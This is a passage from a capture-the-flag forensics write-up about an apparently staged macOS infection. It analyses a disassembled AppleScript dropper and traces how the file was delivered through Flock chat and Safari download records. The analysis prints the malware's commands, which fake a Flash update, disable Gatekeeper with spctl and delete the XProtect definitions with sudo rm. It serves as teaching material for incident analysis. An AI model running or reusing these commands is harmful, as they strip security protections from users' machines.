     00037 PushLiteralExtended 18 # [177, &lt;Value type=string value=b&#39;\x00s\x00u\x00d\x00o\x00 \x00r\x00m\x00 \x00-\x00f\x00 \x00/\x00S\x00y\x00s\x00t\x00e\x00m\x00/\x00L\x00i\x00b\x00r\x00a\x00r\x00y\x00/\x00C\x00o\x00r\x00e\x00S\x00e\x00r\x00v\x00i\x00c\x00e\x00s\x00/\x00X\x00P\x00r\x00o\x00t\x00e\x00c\x00t\x00.\x00b\x00u\x00n\x00d\x00l\x00e\x00/\x00C\x00o\x00n\x00t\x00e\x00n\x00t\x00s\x00/\x00R\x00e\x00s\x00o\x00u\x00r\x00c\x00e\x00s\x00/\x00X\x00P\x00r\x00o\x00t\x00e\x00c\x00t\x00.\x00p\x00l\x00i\x00s\x00t&#39;&gt;]
     0003a PushLiteral 10 # &lt;Value type=object value=&lt;Value type=constant value=0x6261646d&gt;&gt;
     0003b PushTrue &lt;disassembler not implemented&gt;
     0003c Push2
     0003d MessageSend 11 # &lt;Value type=object value=&lt;Value type=event_identifier value=b&#39;syso&#39;-b&#39;exec&#39;-b&#39;TEXT&#39;-b&#39;\xff\xff\x80\x00&#39;-b&#39;TEXT&#39;-b&#39;\x00\x00\x00\x00&#39;&gt;&gt;
     00040 EndErrorHandler 95
 00043 HandleError 12 13
 00048 PushLiteralExtended 19 # [177, &lt;Value type=string value=b&#39;\x00F\x00a\x00i\x00l\x00e\x00d\x00 \x00t\x00o\x00 \x00d\x00i\x00s\x00a\x00b\x00l\x00e\x00 \x00X\x00P\x00r\x00o\x00t\x00e\x00c\x00t\x00:\x00 &#39;&gt;]
 0004b PushVariable [var_0]
 0004c Concatenate
 0004d PushLiteral 1 # &lt;Value type=object value=&lt;Value type=constant value=0x62746e73&gt;&gt;
 0004e PushLiteralExtended 20 # [177, &lt;Value type=string value=b&#39;\x00O\x00K&#39;&gt;]
 00051 Push1
 00052 MakeVector
 00053 PushLiteral 3 # &lt;Value type=object value=&lt;Value type=constant value=0x64666c74&gt;&gt;
 00054 PushLiteralExtended 21 # [177, &lt;Value type=string value=b&#39;\x00O\x00K&#39;&gt;]
 00057 PushLiteral 5 # &lt;Value type=object value=&lt;Value type=constant value=0x64697370&gt;&gt;
 00058 PushLiteralExtended 17 # &lt;Value type=object value=&lt;Value type=constant value=0x7374696300000000&gt;&gt;
 0005b PushLiteral 7 # &lt;Value type=fixnum value=0x6&gt;
 0005c MessageSend 8 # &lt;Value type=object value=&lt;Value type=event_identifier value=b&#39;syso&#39;-b&#39;dlog&#39;-b&#39;askr&#39;-b&#39;\x00\x00\x00\x00&#39;-b&#39;TEXT&#39;-b&#39;\x00\x00\x00\x00&#39;&gt;&gt;
 0005f StoreResult
 00060 PushMe
 00061 Push0
 00062 MessageSend 22 # &lt;Value type=object value=&lt;Value type=event_identifier value=b&#39;ears&#39;-b&#39;ffdr&#39;-b&#39;alis&#39;-b&#39;\x00\x00\x00\x00&#39;-b&#39;afdr&#39;-b&#39;\x00\x00 \x00&#39;&gt;&gt;
 00065 PushLiteralExtended 23 # &lt;Value type=object value=&lt;Value type=constant value=0x70737870&gt;&gt;
 00068 MakeObjectAlias 21 # GetProperty

 00069 PushLiteralExtended 24 # [177, &lt;Value type=string value=b&#39;\x00C\x00o\x00n\x00t\x00e\x00n\x00t\x00s\x00/\x00R\x00e\x00s\x00o\x00u\x00r\x00c\x00e\x00s\x00/\x00p\x00r\x00e\x00v\x00i\x00e\x00w&#39;&gt;]
 0006c Concatenate
 0006d GetData
 0006e PopGlobalExtended b&#39;venomPath&#39;
 00071 StoreResult
 00072 ErrorHandler 129
     00075 PushGlobalExtended b&#39;venomPath&#39;
     00078 PushLiteral 10 # &lt;Value type=object value=&lt;Value type=constant value=0x6261646d&gt;&gt;
     00079 PushTrue &lt;disassembler not implemented&gt;
     0007a Push2
     0007b MessageSend 11 # &lt;Value type=object value=&lt;Value type=event_identifier value=b&#39;syso&#39;-b&#39;exec&#39;-b&#39;TEXT&#39;-b&#39;\xff\xff\x80\x00&#39;-b&#39;TEXT&#39;-b&#39;\x00\x00\x00\x00&#39;&gt;&gt;
     0007e EndErrorHandler 157
 00081 HandleError 12 13
 00086 PushLiteralExtended 26 # [177, &lt;Value type=string value=b&#39;\x00E\x00r\x00r\x00o\x00r\x00 \x00i\x00n\x00s\x00t\x00a\x00l\x00l\x00i\x00n\x00g\x00 \x00u\x00p\x00d\x00a\x00t\x00e\x00:\x00 &#39;&gt;]
 00089 PushVariable [var_0]
 0008a Concatenate
 0008b PushLiteral 1 # &lt;Value type=object value=&lt;Value type=constant value=0x62746e73&gt;&gt;
 0008c PushLiteralExtended 27 # [177, &lt;Value type=string value=b&#39;\x00O\x00K&#39;&gt;]
 0008f Push1
 00090 MakeVector
 00091 PushLiteral 3 # &lt;Value type=object value=&lt;Value type=constant value=0x64666c74&gt;&gt;
 00092 PushLiteralExtended 28 # [177, &lt;Value type=string value=b&#39;\x00O\x00K&#39;&gt;]
 00095 PushLiteral 5 # &lt;Value type=object value=&lt;Value type=constant value=0x64697370&gt;&gt;
 00096 PushLiteralExtended 17 # &lt;Value type=object value=&lt;Value type=constant value=0x7374696300000000&gt;&gt;
 00099 PushLiteral 7 # &lt;Value type=fixnum value=0x6&gt;
 0009a MessageSend 8 # &lt;Value type=object value=&lt;Value type=event_identifier value=b&#39;syso&#39;-b&#39;dlog&#39;-b&#39;askr&#39;-b&#39;\x00\x00\x00\x00&#39;-b&#39;TEXT&#39;-b&#39;\x00\x00\x00\x00&#39;&gt;&gt;
 0009d Return
</code></pre><p>so upon the analysing the disassembled output of the main.scpt of the app from the above tool Here are the key indicators of malicious behaviour:</p>
<ol>
<li><strong>Fake Adobe Flash Update Prompt</strong> ```</li>
</ol>
<pre tabindex="0"><code>PushLiteral 0 → &#34;Adobe Flash Update Required\n\nPlease install the latest update to continue.&#34;
PushLiteral 2 → &#34;Install&#34;
MessageSend → Display dialog
</code></pre><ul>
<li>Flash has been deprecated since 2020 and also why would a Image editing application use this prompt ,This mimics historic malware tactics like the <code>Shlayer Trojan</code>, which used fake Flash updaters</li>
</ul>
<ol start="2">
<li><strong>Disabling Gatekeeper</strong></li>
</ol>
<pre tabindex="0"><code>PushLiteral 9 → &#34;spctl --master-disable&#34;
MessageSend → syso-exec (system execution)
</code></pre><ul>
<li><code>spctl</code> controls Gatekeeper, the macOS security feature that blocks unverified apps.</li>
<li>Disabling it allows unsigned malicious apps to run freely, Legitimate applications never disable Gatekeeper silently.</li>
</ul>
<ol start="3">
<li><strong>Tampering with <code>XProtect</code> (Apple’s Built-in Malware Protection)</strong></li>
</ol>
<pre tabindex="0"><code>PushLiteral → &#34;sudo rm -f /System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.plist&#34;
MessageSend → syso-exec
</code></pre><ul>
<li>This deletes the <strong>XProtect malware definition file</strong>, effectively <strong>disabling macOS’s basic antivirus system</strong>.</li>
<li><code>XProtect</code> protects users from known malware — removing it is a known <strong>persistence and evasion technique</strong>.</li>
</ul>
<ol start="4">
<li><strong>Accessing Script’s Bundle Path &amp; Extracting Payload</strong></li>
</ol>
<pre tabindex="0"><code>MakeObjectAlias → Contents/Resources/preview
GetData
Store in: venomPath
</code></pre><ul>
<li>The script fetches a file called <code>preview</code> from its own Resources folder,Name like <code>venomPath</code> implies it might be <strong>a hidden payload</strong> and Later executed via <code>syso-exec</code>.</li>
</ul>
<p>Thus, from all the above indicators we can conclude that our suspicion was right and <code>ImageEnhancePro.app</code> was indeed the malicious application.</p>
<p>Q4/15) Which application was used to facilitate the download of the malicious application responsible for the infection? Format: Appname
ok for the above question we can see that safari was running, from the pslist output:</p>
<pre tabindex="0"><code>0xff80262f8798  Safari  515     501     20      2025-06-07 02:24:43.552119      1
</code></pre><p>since safari was running, and we found the malicious app <code>ImageEnhancePro.app</code> under <code>Downloads</code> ,we can try checking the Download history of safari browser to from where was it downloaded , so in order to check the history we need to get The <code>History.db</code> file under <code>/Users/admin/Library/Safari/History.db</code> , once dump the file:</p>
<pre tabindex="0"><code>0xffffff802706b1e0 /Users/admin/Library/Safari/History.db
</code></pre><p>when we open the <code>History.db</code> using  <code>DB Browser for SQLite</code> or any sqliteviewer and browse the <code>history_items</code> table:
<img src="images/6.png" alt="History.db">
we can see that Flock a communication chat application was downloaded, we can also see it under the <code>Downloads</code> folder:</p>
<pre tabindex="0"><code>0xffffff802bb215a0 /Users/admin/Downloads/Flock-macOS-2.2.513.dmg
</code></pre><p>so we can assume that Flock could be our potential application which was used for the download of the malicious application, to confirm this we can check <code>Downloads.plist</code> (A <strong>Property List (plist)</strong> file is a structured file used in macOS and iOS to store <strong>configuration settings</strong>, <strong>preferences</strong>, and <strong>metadata</strong> for apps and system services, It can be in <strong>XML</strong> or <strong>binary</strong> format.) from  <code>/Users/admin/Library/Safari/Downloads.plist</code> , upon dumping the file using volatlility2:</p>
<pre tabindex="0"><code>Volatility Foundation Volatility Framework 2.6.1
Wrote 3037 bytes to Downloads.plist from vnode at address ffffff802f9d84b0
</code></pre><p>upon checking the file type:</p>
<pre tabindex="0"><code>Downloads.plist: Apple binary property list
</code></pre><p>so we convert it to xml from binary format using <code>plutil</code> on macOS terminal using :</p>
<pre tabindex="0"><code>plutil -convert xml1 Downloads.plist -o output.plist
</code></pre><p>or we can also use <code>python3.9+</code> using the <code>plistlib</code> module:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> plistlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;Downloads.plist&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> plistlib<span style="color:#f92672">.</span>load(f)  <span style="color:#75715e"># auto detects binary or XML</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;output.plist&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    plistlib<span style="color:#f92672">.</span>dump(data, f, fmt<span style="color:#f92672">=</span>plistlib<span style="color:#f92672">.</span>FMT_XML)
</span></span></code></pre></div><p>after converting it to XML format which is easy to read :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;plist</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.0&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;key&gt;</span>DownloadHistory<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;array&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryBookmarkBlob<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;data&gt;</span>
</span></span><span style="display:flex;"><span>                        Ym9va9ADAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span>                        AAAAAAAAAAAAzAIAAAUAAAABAQAAVXNlcnMAAAAFAAAAAQEAAGFk
</span></span><span style="display:flex;"><span>                        bWluAAAACQAAAAEBAABEb3dubG9hZHMAAAAcAAAAAQEAAEltYWdl
</span></span><span style="display:flex;"><span>                        RW5oYW5jZVByby56aXAuZG93bmxvYWQTAAAAAQEAAEltYWdlRW5o
</span></span><span style="display:flex;"><span>                        YW5jZVByby56aXAAFAAAAAEGAAAEAAAAFAAAACQAAAA4AAAAXAAA
</span></span><span style="display:flex;"><span>                        AAgAAAAEAwAAszAGAAAAAAAIAAAABAMAAP+IBgAAAAAACAAAAAQD
</span></span><span style="display:flex;"><span>                        AAACiQYAAAAAAAgAAAAEAwAAhNUIAAAAAAAIAAAABAMAAIXVCAAA
</span></span><span style="display:flex;"><span>                        AAAAFAAAAAEGAACUAAAApAAAALQAAADEAAAA1AAAAAgAAAAABAAA
</span></span><span style="display:flex;"><span>                        Qcb5xrsAAAAYAAAAAQIAAAEAAAAAAAAADwAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span>                        AAgAAAAEAwAAAwAAAAAAAAAEAAAAAwMAAPUBAAAIAAAAAQkAAGZp
</span></span><span style="display:flex;"><span>                        bGU6Ly8vBgAAAAEBAABTeXN0ZW0AAAgAAAAEAwAAACDBTCUAAAAI
</span></span><span style="display:flex;"><span>                        AAAAAAQAAEG9U2lNAAAAJAAAAAEBAABFQkMyRkIyQy05MjE2LTNF
</span></span><span style="display:flex;"><span>                        OTUtQURCOC1BQzdFNTRDOTA2ODcYAAAAAQIAAIEAAAABAAAA7xMA
</span></span><span style="display:flex;"><span>                        AAEAAAAAAAAAAAAAAAEAAAABAQAALwAAAAAAAAABBQAA2AAAAAEC
</span></span><span style="display:flex;"><span>                        AAA0MmU4YjM5NjVlMDljODljN2IyZmU5OTk3Y2U2MjVkY2UyY2M0
</span></span><span style="display:flex;"><span>                        ZTNiOzAwMDAwMDAwOzAwMDAwMDAwOzAwMDAwMDAwMDAwMDAwMjA7
</span></span><span style="display:flex;"><span>                        Y29tLmFwcGxlLmFwcC1zYW5kYm94LnJlYWQtd3JpdGU7MDAwMDAw
</span></span><span style="display:flex;"><span>                        MDE7MDEwMDAwMDM7MDAwMDAwMDAwMDA4ZDU4NTsvdXNlcnMvYWRt
</span></span><span style="display:flex;"><span>                        aW4vZG93bmxvYWRzL2ltYWdlZW5oYW5jZXByby56aXAuZG93bmxv
</span></span><span style="display:flex;"><span>                        YWQvaW1hZ2VlbmhhbmNlcHJvLnppcADMAAAA/v///wEAAAAAAAAA
</span></span><span style="display:flex;"><span>                        EAAAAAQQAAB4AAAAAAAAAAUQAADkAAAAAAAAABAQAAAQAQAAAAAA
</span></span><span style="display:flex;"><span>                        AEAQAAAAAQAAAAAAAAIgAADYAQAAAAAAAAUgAABMAQAAAAAAABAg
</span></span><span style="display:flex;"><span>                        AABcAQAAAAAAABEgAACMAQAAAAAAABIgAABsAQAAAAAAABMgAAB8
</span></span><span style="display:flex;"><span>                        AQAAAAAAACAgAAC4AQAAAAAAADAgAADkAQAAAAAAAAHAAAAwAQAA
</span></span><span style="display:flex;"><span>                        AAAAABHAAAAUAAAAAAAAABLAAABAAQAAAAAAAIDwAADsAQAAAAAA
</span></span><span style="display:flex;"><span>                        AA==
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;/data&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryDateAddedKey<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;date&gt;</span>2025-06-06T20:56:22Z<span style="color:#f92672">&lt;/date&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryDateFinishedKey<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;date&gt;</span>2025-06-06T20:56:22Z<span style="color:#f92672">&lt;/date&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryIdentifier<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;string&gt;</span>08A4C4A7-63C1-4588-A2F7-BD8AF0249895<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryPath<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;string&gt;</span>~/Downloads/ImageEnhancePro.zip.download/ImageEnhancePro.zip<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryPostBookmarkBlob<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;data&gt;</span>
</span></span><span style="display:flex;"><span>                        Ym9va3gDAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span>                        AAAAAAAAAAAAdAIAAAUAAAABAQAAVXNlcnMAAAAFAAAAAQEAAGFk
</span></span><span style="display:flex;"><span>                        bWluAAAACQAAAAEBAABEb3dubG9hZHMAAAATAAAAAQEAAEltYWdl
</span></span><span style="display:flex;"><span>                        RW5oYW5jZVByby5hcHAAEAAAAAEGAAAEAAAAFAAAACQAAAA4AAAA
</span></span><span style="display:flex;"><span>                        CAAAAAQDAACzMAYAAAAAAAgAAAAEAwAA/4gGAAAAAAAIAAAABAMA
</span></span><span style="display:flex;"><span>                        AAKJBgAAAAAACAAAAAQDAACJ1QgAAAAAABAAAAABBgAAbAAAAHwA
</span></span><span style="display:flex;"><span>                        AACMAAAAnAAAAAgAAAAABAAAQcb4dV0AAAAYAAAAAQIAAAIAAAAA
</span></span><span style="display:flex;"><span>                        AAAADwAAAAAAAAAAAAAAAAAAAAgAAAAEAwAAAgAAAAAAAAAEAAAA
</span></span><span style="display:flex;"><span>                        AwMAAPUBAAAIAAAAAQkAAGZpbGU6Ly8vBgAAAAEBAABTeXN0ZW0A
</span></span><span style="display:flex;"><span>                        AAgAAAAEAwAAACDBTCUAAAAIAAAAAAQAAEG9U2lNAAAAJAAAAAEB
</span></span><span style="display:flex;"><span>                        AABFQkMyRkIyQy05MjE2LTNFOTUtQURCOC1BQzdFNTRDOTA2ODcY
</span></span><span style="display:flex;"><span>                        AAAAAQIAAIEAAAABAAAA7xMAAAEAAAAAAAAAAAAAAAEAAAABAQAA
</span></span><span style="display:flex;"><span>                        LwAAAAAAAAABBQAAuwAAAAECAAA1M2JhNTY5MGJmN2U3Y2E2NjMw
</span></span><span style="display:flex;"><span>                        NWYxOTViNzBkNmQ0MWVkNWRiYzEwOzAwMDAwMDAwOzAwMDAwMDAw
</span></span><span style="display:flex;"><span>                        OzAwMDAwMDAwMDAwMDAwMjA7Y29tLmFwcGxlLmFwcC1zYW5kYm94
</span></span><span style="display:flex;"><span>                        LnJlYWQtd3JpdGU7MDAwMDAwMDE7MDEwMDAwMDM7MDAwMDAwMDAw
</span></span><span style="display:flex;"><span>                        MDA4ZDU4OTsvdXNlcnMvYWRtaW4vZG93bmxvYWRzL2ltYWdlZW5o
</span></span><span style="display:flex;"><span>                        YW5jZXByby5hcHAAAMwAAAD+////AQAAAAAAAAAQAAAABBAAAFQA
</span></span><span style="display:flex;"><span>                        AAAAAAAABRAAAKwAAAAAAAAAEBAAANQAAAAAAAAAQBAAAMQAAAAA
</span></span><span style="display:flex;"><span>                        AAAAAiAAAJwBAAAAAAAABSAAABABAAAAAAAAECAAACABAAAAAAAA
</span></span><span style="display:flex;"><span>                        ESAAAFABAAAAAAAAEiAAADABAAAAAAAAEyAAAEABAAAAAAAAICAA
</span></span><span style="display:flex;"><span>                        AHwBAAAAAAAAMCAAAKgBAAAAAAAAAcAAAPQAAAAAAAAAEcAAABQA
</span></span><span style="display:flex;"><span>                        AAAAAAAAEsAAAAQBAAAAAAAAgPAAALABAAAAAAAA
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;/data&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryPostPath<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;string&gt;</span>~/Downloads/ImageEnhancePro.app<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryProgressBytesSoFar<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;integer&gt;</span>98438<span style="color:#f92672">&lt;/integer&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryProgressTotalToLoad<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;integer&gt;</span>98438<span style="color:#f92672">&lt;/integer&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryRemoveWhenDoneKey<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;false/&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;key&gt;</span>DownloadEntryURL<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&lt;string&gt;</span>https://fs.flockusercontent.com/667148/ab3908f17491315471862a59?response-content-disposition=attachment%3Bfilename*%3DUTF-8%27%27ImageEnhancePro.zip&amp;amp;Expires=1749243980&amp;amp;Signature=XsmOpvAQ-yy~gDUI5snkCweJXIoRpbH8qJtL1j0zGl5x7EHsMLoMkvlvh7g5XLZePKbPAhB0EFCfRSw4h4Dko9duyRA-~0aqq3R4EMNmxUOxxRGONvmn-rUSjNqRCCf8j1O1m0RivONFtJPLOITxB6z3D74P14aG-zH6P5aTzMfvhBF-F0CpN3CwqlYGJS-3NiTRIrm3nDaMgEDGGwFUKsmdthkYlUPl2VVAFNDusg8oKCLfP7ibt6NtEFBzF8IRfAQ5KWOR80yuc6fFF7wi79kkS8Qs626wJaWipFMKPH4H~N-~Gdlp3fNBskpcrUVuSWsveAoScf4FROEfTqdtqw__&amp;amp;Key-Pair-Id=APKAJMN6OEFOLBEBMIJA<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/array&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/plist&gt;</span>
</span></span></code></pre></div><p>we can see in the <code>string</code> field at the bottom of the xml plist that it was indeed download <code>Flock</code></p>
<p>Q5/15) What are the username and email address associated with the Flock account that sent the malicious application? Format: <em>Username_email</em></p>
<p>To track down the Flock account behind the malicious <code>ImageEnhancePro.app</code>, after conducting some research for patterns for the format used for flock to store messages ,since Flock is a messaging platform, we figured its messages might be stashed in memory. All the flock messages can be obtained from the memory dump by using <code>strings</code> and grepping  for <code>flockMessages</code> on the whole memory dump <code>chall.raw</code> :</p>
<pre tabindex="0"><code>$ strings chall.raw | grep flockMessages &gt; chats.json
</code></pre><p>and after formatting it into <code>.json</code> , u can easily read the messages in <code>&quot;text&quot;:</code> field :</p>
<pre tabindex="0"><code>&#34;timestamp&#34;: &#34;1748684188695&#34;,

&#34;timestampInMillis&#34;: 1748684188695,

&#34;uid&#34;: &#34;1748684188695-LP1-m203&#34;,

&#34;actions&#34;: [],

&#34;ignoreActions&#34;: [],

&#34;x&#34;: {}

}

],

&#34;chat&#34;: &#34;vx1x621ffzs2zyy6@go.to&#34;

}

], Parker) made sure I’d never get a fair shot here. But I’m not one to hold grudges… or am I?\nAs a parting gift, I’m sharing a tool I’ve been using to up my photography game: PhotoProEnhancer.app. It’s hands-down the best editing software I’ve come across—perfect for making those “perfect shots” that apparently I couldn’t deliver, right, Peter? It’s got some killer features that’ll make your pics pop, even if you’re just snapping Spider-Man swinging by. Give it a spin, team. Maybe it’ll help you see things from a different angle… like I do now.\n\nCatch you later (or not),\nEddie Brock&#34;,&#34;timestamp&#34;:&#34;1749131530216&#34;,&#34;timestampInMillis&#34;:1749131530216,&#34;uid&#34;:&#34;1749131530216-tEO-m201&#34;,&#34;actions&#34;:[],&#34;ignoreActions&#34;:[],&#34;x&#34;:{}}],&#34;chat&#34;:&#34;667148_lobby@groups.go.to&#34;},{&#34;messages&#34;:[],&#34;receipts&#34;:[{&#34;jid&#34;:&#34;k47pkcc74p5lb5lk@go.to&#34;,&#34;lr&#34;:1749131547760}],&#34;flockMessages&#34;:[{&#34;attachments&#34;:[{&#34;forward&#34;:true,&#34;views&#34;:{},&#34;downloads&#34;:[{&#34;mime&#34;:&#34;application/x-zip-compressed&#34;,&#34;src&#34;:&#34;https: //f.flockusercontent3.com/667148/ab3908f17491315471862a59&#34;,&#34;filename&#34;:&#34;ImageEnhancePro.zip&#34;,&#34;size&#34;:98438,&#34;id&#34;:&#34;667148/ab3908f17491315471862a59&#34;}],&#34;buttons&#34;:[]}],&#34;headers&#34;:{&#34;bt&#34;:&#34;file&#34;},&#34;type&#34;:&#34;GROUPCHAT&#34;,&#34;id&#34;:&#34;d_1749131542740_g1yq4bt1&#34;
</code></pre><p>so from this we know that Eddie Brock was the one who sent the malicious application <code>ImageEnhancerPro.app</code> so we need to find the username and email (also for this question particularly i made a mistake by including it as the username in the question maybe name would have been appropriate i could not change it during the CTF because few people already have gone past it), for this we can leverage the IndexedDb  and we find an email <code>hecoj34842@eduhed.com</code> not associated with all the other members present in the team to confirm we can also add this email to our team  we can see it is Eddie Brock indeed, also from other email patterns we can figure out that <code>Hecoj4842</code> is the username
therefore the answer is :</p>
<pre tabindex="0"><code>Hecoj34842_hecoj34842@eduhed.com
</code></pre><p>Q6/15) What is the user name and email address of the user who advised Peter Parker to take his laptop for repair, what is the name of the recommended repair service, and in which Flock channel was this advice given? Format: <em>User-Name_email_Place_Channel:_Name</em></p>
<p>From the above analysis of the above question we also found:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#e6db74">&#34;flockMessages&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> [
</span></span><span style="display:flex;"><span>                    {
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;profile&#34;</span>: {
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Spiderman: Menace&#34;</span>,
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">&#34;avatar&#34;</span>: <span style="color:#e6db74">&#34;https://g.flockusercontent.com/channel-type-general.png&#34;</span>,
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">&#34;unnamed&#34;</span>: <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>                        },
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;config&#34;</span>: {
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;open&#34;</span>,
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">&#34;privileges&#34;</span>: {
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;teamMember&#34;</span>: {
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;join&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>
</span></span><span style="display:flex;"><span>                                },
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;groupAffiliate&#34;</span>: {
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;addAffiliate&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;affiliationChange&#34;</span>: <span style="color:#e6db74">&#34;moderator&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;appInstall&#34;</span>: <span style="color:#e6db74">&#34;moderator&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;appUsage&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;configChange&#34;</span>: <span style="color:#e6db74">&#34;moderator&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;deleteOthersPost&#34;</span>: <span style="color:#e6db74">&#34;none&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;deleteSelfPost&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;leave&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;muteGroup&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;post&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>,
